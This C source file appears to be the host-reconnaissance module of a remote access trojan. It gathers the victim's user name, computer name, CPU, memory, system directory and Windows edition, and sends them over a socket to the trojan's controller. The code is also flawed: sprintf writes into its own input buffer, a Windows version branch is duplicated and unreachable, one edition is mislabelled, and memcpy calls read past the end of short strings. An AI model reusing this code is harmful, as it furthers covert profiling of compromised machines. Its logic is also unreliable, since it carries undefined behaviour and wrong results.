#include "SysInfo.h"

SYSFUNC SysFunc[CMDNUMS] = {0};
PRODUCTINFOFUNC GetProductFunc = {0};

//SYS_VIEW封装函数
BOOL SysView(SOCKET sockfd,int dwRecvSize)
{
	int dwSize = sizeof(RatProto) + sizeof(SysInfo)*CMDNUMS;
	char* pData = (char*)malloc(dwSize);
	if (pData)
	{
		((RatProto*)pData)->RatId = SYS_VIEW;
		((RatProto*)pData)->RatCsm = NULL;
		((RatProto*)pData)->RatLen = dwSize;
	}
	SysInfo* pTemp = (SysInfo*)(pData+sizeof(RatProto));
	char *szName[]= {"User Name","CPU Name","Physical Memory","Processors","System Directory","Model","CPU Type","Windows Version"};
	SysFunc[0] = GetUserName;
	SysFunc[1] = GetCpuName;
	SysFunc[2] = GetPhyMemroy;
	SysFunc[3] = GetProcessors;
	SysFunc[4] = GetSysDirectory;
	SysFunc[5] = GetModel;
	SysFunc[6] = GetCpuType;
	SysFunc[7] = GetWinVersion;

	for (int i=0;i<CMDNUMS;i++)
	{
		memcpy(pTemp->Name,szName[i],20);
		SYSFUNC sysfunc = SysFunc[i];
		sysfunc(pTemp->Value);
		pTemp++;
	}

	BOOL flag = SendCmd(sockfd,pData,dwSize);
	free(pData);
	if (!flag)
	{
		SocketError(sockfd);
		return FALSE;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//SYSINFO获取函数
//////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////
//USER NAME
//////////////////////////////////////////////////////////////////////////
char* GetUserName(char* pData)
{
	int dwSize = 80;
	GetUserName((LPSTR)pData, (LPDWORD)&dwSize);

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//CPU NAME
//////////////////////////////////////////////////////////////////////////
char* GetCpuName(char* pData)
{
	int dwSize = 80;
	GetComputerName(pData,(LPDWORD)&dwSize);

	return pData;
}





char* GetCpuType(char* pData)
{
	HKEY	hKey;
	int nRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,REGPATH,NULL,KEY_READ,&hKey);
	if (nRet != ERROR_SUCCESS)
	{
		memcpy(pData,"NULL",80);
	}
	int dwSize = 80;
	nRet = RegQueryValueEx(hKey,"ProcessorNameString",NULL,NULL,(unsigned char*)pData,(LPDWORD)&dwSize);
	if (nRet != ERROR_SUCCESS)
	{
		memcpy(pData,"NULL",80);
	}
	RegCloseKey(hKey);

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//Windows Version
//////////////////////////////////////////////////////////////////////////
char* GetWinVersion(char* pData)
{
	NEWOSVERSIONINFOEX	osvi;
	SYSTEM_INFO			si;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(NEWOSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(NEWOSVERSIONINFOEX);

	BOOL flag = GetVersionEx((LPOSVERSIONINFOA)&osvi);
	if (!flag)
	{
		sprintf(pData,"No Information");
		return pData;
	}

	GetNativeSystemInfo(&si);
	if (osvi.dwPlatformId==VER_PLATFORM_WIN32_NT && osvi.dwMajorVersion>=5)
	{
		sprintf(pData,"Microsoft ");
		if (osvi.dwMajorVersion==6 && osvi.dwMinorVersion==0)
		{
			if (osvi.wProductType == VER_NT_WORKSTATION)
			{
				sprintf(pData,"Windows Vista ");
			}
			else
			{
				sprintf(pData,"Windows Server 2008 ");
			}
			int dwType = 0;
			GetProductFunc = (PRODUCTINFOFUNC)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetProductInfo");
			GetProductFunc(6,0,0,0,(LPDWORD)&dwType);
			switch (dwType)
			{
			case PRODUCT_ULTIMATE:
				sprintf(pData, "%sUltimate Edition", pData);
				break;
			case PRODUCT_HOME_PREMIUM:
				sprintf(pData, "%sUltimate Edition", pData);
				break;
			case PRODUCT_HOME_BASIC:
				sprintf(pData, "%sHome Basic Edition", pData);
				break;
			case PRODUCT_ENTERPRISE:
				sprintf(pData, "%sEnterprise Edition", pData);
				break;
			case PRODUCT_BUSINESS:
				sprintf(pData, "%sBusiness Edition", pData);
				break;
			case PRODUCT_STARTER:
				sprintf(pData, "%sStarter Edition", pData);
				break;
			case PRODUCT_CLUSTER_SERVER:
				sprintf(pData, "%sCluster Server Edition", pData);
				break;
			case PRODUCT_DATACENTER_SERVER:
				sprintf(pData, "%sDatacenter Edition", pData);
				break;
			case PRODUCT_DATACENTER_SERVER_CORE:
				sprintf(pData, "%sDatacenter Edition (core installation)", pData);
				break;
			case PRODUCT_ENTERPRISE_SERVER:
				sprintf(pData, "%sEnterprise Edition", pData);
				break;
			case PRODUCT_ENTERPRISE_SERVER_CORE:
				sprintf(pData, "%sEnterprise Edition (core installation)", pData);
				break;
			case PRODUCT_ENTERPRISE_SERVER_IA64:
				sprintf(pData, "%sEnterprise Edition for Itanium-based Systems", pData);
				break;
			case PRODUCT_SMALLBUSINESS_SERVER:
				sprintf(pData, "%sSmall Business Server", pData);
				break;
			case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
				sprintf(pData, "%sSmall Business Server Premium Edition", pData);
				break;
			case PRODUCT_STANDARD_SERVER:
				sprintf(pData, "%sStandard Edition", pData);
				break;
			case PRODUCT_STANDARD_SERVER_CORE:
				sprintf(pData, "%sStandard Edition (core installation)", pData);
				break;
			case PRODUCT_WEB_SERVER:
				sprintf(pData, "%sWeb Server Edition", pData);
				break;
			default:
				break;
			}
			if (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
			{
				sprintf(pData,"%s,64-Bit",pData);
			}
			else if (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_INTEL)
			{
				sprintf(pData,"%s,32-Bit",pData);
			}
		}
		else if (osvi.dwMajorVersion==5 && osvi.dwMinorVersion==2)
		{
			if (GetSystemMetrics(SM_SERVERR2))
			{
				sprintf(pData,"%sWindows Server 2003 R2, ",pData);
			}
			else if (osvi.wSuiteMask==VER_SUITE_STORAGE_SERVER)
			{
				sprintf(pData,"%sWindows Storage Server 2003",pData);
			}
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
			{
				sprintf(pData,"%sWindows XP Professional x64 Edition",pData);
			}
			else
			{
				sprintf(pData,"%sWindows Server 2003",pData);
			}
			if ( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64 ){
				sprintf(pData, "%s, 64-bit", pData);
			}else if( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_INTEL ){
				sprintf(pData, "%s, 32-bit", pData);
			}
		}
		else if( osvi.dwMajorVersion==5 && osvi.dwMinorVersion==2 )
		{
			if( GetSystemMetrics(SM_SERVERR2) ){
				sprintf(pData, "%sWindows Server 2003 R2, ", pData);
			}else if( osvi.wSuiteMask==VER_SUITE_STORAGE_SERVER ){
				sprintf(pData, "%sWindows Storage Server 2003", pData);
			}else if( osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64){
				sprintf(pData, "%sWindows XP Professional x64 Edition", pData);
			}
			else
			{
				sprintf(pData, "%sWindows Server 2003, ", pData);
			}

			if( osvi.wProductType!=VER_NT_WORKSTATION )
			{
				if( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_IA64 )
				{
					if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
					{
						sprintf(pData, "%sDatacenter Edition for Itanium-based Systems", pData);
					}else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
					{
						sprintf(pData, "%sEnterprise Edition for Itanium-based Systems", pData);
					}
				}else if (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
				{
					if(osvi.wSuiteMask & VER_SUITE_DATACENTER)
					{
						sprintf(pData, "%sDatacenter x64 Edition", pData);
					}else if(osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
					{
						sprintf(pData, "%sEnterprise x64 Edition", pData);
					}else
					{
						sprintf(pData, "%sStandard x64 Edition", pData);
					}
				}
				else
				{
					if( osvi.wSuiteMask & VER_SUITE_COMPUTE_SERVER )
					{
						sprintf(pData, "%sCompute Cluster Edition", pData);
					}
					else if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
					{
						sprintf(pData, "%sDatacenter Edition", pData);
					}
					else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
					{
						sprintf(pData, "%sEnterprise Edition", pData);
					}
					else if ( osvi.wSuiteMask & VER_SUITE_BLADE )
					{
						sprintf(pData, "%sWeb Edition", pData);
					}
					else
					{
						sprintf(pData, "%sStandard Edition", pData);
					}
				}
			}
		}
		else if( osvi.dwMajorVersion==5 && osvi.dwMinorVersion==1 )
		{
			sprintf(pData, "%sWindows XP ", pData);
			if( osvi.wSuiteMask & VER_SUITE_PERSONAL )
			{
				sprintf(pData, "%sHome Edition", pData);
			}else
			{
				sprintf(pData, "%sProfessional", pData);
			}
		}
		else if( osvi.dwMajorVersion==5 && osvi.dwMinorVersion==0 )
		{
			sprintf(pData, "%sWindows 2000 ", pData);
			if ( osvi.wProductType == VER_NT_WORKSTATION )
			{
				sprintf(pData, "%sProfessional", pData);
			}
			else
			{
				if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
				{
					sprintf(pData, "%sDatacenter Server", pData);
				}
				else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
				{
					sprintf(pData, "%sAdvanced Server", pData);
				}
				else
				{
					sprintf(pData, "%sServer", pData);
				}
			}
		}
		else if( osvi.dwMajorVersion==4 && osvi.dwMinorVersion==0 )
		{
			sprintf(pData, "%sMicrosoft Windows 95 ", pData);
			if( osvi.szCSDVersion[1]=='C' || osvi.szCSDVersion[1]=='B' )
			{
				sprintf(pData, "%sOSR2 ", pData);	
			}
		}
		else if( osvi.dwMajorVersion==4 && osvi.dwMinorVersion==10 )
		{
			sprintf(pData, "%sMicrosoft Windows 98 ", pData);
			if( osvi.szCSDVersion[1]=='A' )
			{
				sprintf(pData, "%sSE ", pData);
			}
		}
		else if( osvi.dwMajorVersion==4 && osvi.dwMinorVersion==90 )
		{
			sprintf(pData, "%sMicrosoft Windows Millennium Edition", pData);
		}
		if( lstrlen(osvi.szCSDVersion)>0 ){
			sprintf(pData, "%s %s", pData, osvi.szCSDVersion);
		}
		sprintf(pData, "%s (build %d)", pData, osvi.dwBuildNumber);
	}

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//System Directory
//////////////////////////////////////////////////////////////////////////
char* GetSysDirectory(char* pData)
{
	int dwSize = 80;
	GetSystemDirectory(pData,dwSize);

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//Total Physical Memory
//////////////////////////////////////////////////////////////////////////
char* GetPhyMemroy(char* pData)
{
	MEMORYSTATUS	stMemory;
	GlobalMemoryStatus(&stMemory);
	if (stMemory.dwTotalPhys >= 1000000)
	{
		double mem = (double)stMemory.dwTotalPhys/(double)1024000000;
		sprintf(pData,"%u%%usage (Total:%0.2lfGB)",stMemory.dwMemoryLoad,mem);
	}
	else
	{
		double mem = (double)stMemory.dwTotalPhys/(double)1024000;
		sprintf(pData,"%u%%usage (Total:%0.2lfMB)",stMemory.dwMemoryLoad,mem);
	}

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//Number of Processors
//////////////////////////////////////////////////////////////////////////
char* GetProcessors(char* pData)
{
	SYSTEM_INFO sys = {0};
	GetSystemInfo(&sys);
	sprintf(pData,"%d",sys.dwNumberOfProcessors);

	return pData;
}


//////////////////////////////////////////////////////////////////////////
//Model
//////////////////////////////////////////////////////////////////////////
char* GetModel(char* pData)
{
	HKEY	hKey;
	int nRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,REGPATH,NULL,KEY_READ,&hKey);
	if (nRet != ERROR_SUCCESS)
	{
		memcpy(pData,"NULL",80);
	}
	int dwSize = 80;
	nRet = RegQueryValueEx(hKey,TEXT("Identifier"),NULL,NULL,(unsigned char*)pData,(LPDWORD)&dwSize);
	if (nRet != ERROR_SUCCESS)
	{
		memcpy(pData,"NULL",80);
	}
	RegCloseKey(hKey);

	return pData;
}